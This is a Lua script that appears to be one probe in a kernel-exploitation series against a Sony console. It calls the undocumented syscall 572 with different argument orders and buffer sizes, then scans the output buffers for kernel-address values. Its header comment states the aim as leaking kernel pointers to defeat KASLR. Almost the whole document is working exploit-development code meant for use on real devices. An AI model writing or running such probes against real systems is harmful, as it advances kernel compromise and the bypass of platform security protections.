-- CRASH_CLASS: LOW
-- PROBE 54i: Examine sys 572 output buffer (returned 0 = SUCCESS in 51a)
--
-- Context: sys 572 is a VM-related Sony syscall. It returned 0 in 51a survey
-- but nobody examined the output buffer. If it writes kernel data into
-- userland buffers, we may find kernel pointers for KASLR defeat.

print("=== PROBE 54i: SYS 572 BUFFER EXAMINATION ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function signed32(v)
    if type(v) == "table" and v.h then
        if v.h == 0xFFFFFFFF then return v.l - 0x100000000 end
        if v.h == 0 and v.l >= 0x80000000 then return v.l - 0x100000000 end
    end
    local n = to_num(v)
    if n >= 0x80000000 and n < 0x100000000 then return n - 0x100000000 end
    return n
end

local sc572 = make_syscall(572)

-- Phase 1: Reproduce the ret=0 from 51a and examine buffer
print("[*] Phase 1: Reproduce 51a pattern (arg0=0, outbuf, size)")
print("")

local sizes = {64, 256, 1024, 4096}
for _, bufsize in ipairs(sizes) do
    local outbuf = memory.alloc(bufsize + 64)
    for i = 0, bufsize - 1, 4 do safe_wd(outbuf + i, 0xDEADBEEF) end

    local ok, ret = pcall(function()
        return sc572(uint64(0), uint64(outbuf), uint64(bufsize), uint64(0), uint64(0), uint64(0))
    end)

    if ok then
        local rv = signed32(ret)
        print(string.format("  572(0, outbuf, %d) = %d", bufsize, rv))
        if rv == 0 then
            print("  >>> SUCCESS! Scanning buffer for kernel pointers...")
            local kptr_count = 0
            for i = 0, bufsize - 8, 8 do
                local qv = safe_rq(outbuf + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        print(string.format("  >>> KPTR at +%d: %s", i, hexval(qv)))
                        kptr_count = kptr_count + 1
                    end
                    if h ~= 0xDEADBEEF and (h ~= 0 or l ~= 0) and l ~= 0xDEADBEEF then
                        local d0 = safe_rd(outbuf + i)
                        local d1 = safe_rd(outbuf + i + 4)
                        if d0 ~= 0xDEADBEEF or d1 ~= 0xDEADBEEF then
                            print(string.format("  DATA at +%d: %s", i, hexval(qv)))
                        end
                    end
                end
            end
            print(string.format("  Kernel pointers found: %d", kptr_count))
        end
    else
        print(string.format("  572(0, outbuf, %d) CRASHED: %s", bufsize, tostring(ret)))
    end
end
print("")

-- Phase 2: Try different arg0 values (command/subcommand?)
print("[*] Phase 2: Vary arg0 (0-20)")
print("")
local outbuf2 = memory.alloc(4096)
for cmd = 0, 20 do
    for i = 0, 1023, 4 do safe_wd(outbuf2 + i, 0) end

    local ok, ret = pcall(function()
        return sc572(uint64(cmd), uint64(outbuf2), uint64(1024), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf2)
        local q1 = safe_rq(outbuf2 + 8)
        print(string.format("  cmd=%2d  ret=%d  [0]=%s [8]=%s", cmd, rv, hexval(q0), hexval(q1)))
        if rv == 0 then
            for i = 0, 120, 8 do
                local qv = safe_rq(outbuf2 + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        print(string.format("  >>> KPTR at +%d: %s", i, hexval(qv)))
                    end
                end
            end
        end
    else
        print(string.format("  cmd=%2d  CRASHED: %s", cmd, tostring(ret)))
    end
end
print("")

-- Phase 3: Try outbuf as arg1 (different calling convention)
print("[*] Phase 3: 572(outbuf, size, 0...) and 572(outbuf, cmd, size...)")
print("")
for cmd = 0, 5 do
    for i = 0, 1023, 4 do safe_wd(outbuf2 + i, 0) end
    local ok, ret = pcall(function()
        return sc572(uint64(outbuf2), uint64(cmd), uint64(1024), uint64(0), uint64(0), uint64(0))
    end)
    if ok then
        local rv = signed32(ret)
        local q0 = safe_rq(outbuf2)
        print(string.format("  572(outbuf, %d, 1024) = %d  [0]=%s", cmd, rv, hexval(q0)))
        if rv == 0 then
            for i = 0, 120, 8 do
                local qv = safe_rq(outbuf2 + i)
                if qv then
                    local h, l = get_hi_lo(qv)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        print(string.format("  >>> KPTR at +%d: %s", i, hexval(qv)))
                    end
                end
            end
        end
    else
        print(string.format("  572(outbuf, %d, 1024) CRASHED: %s", cmd, tostring(ret)))
    end
end

print("")
print("=== PROBE 54i COMPLETE ===")
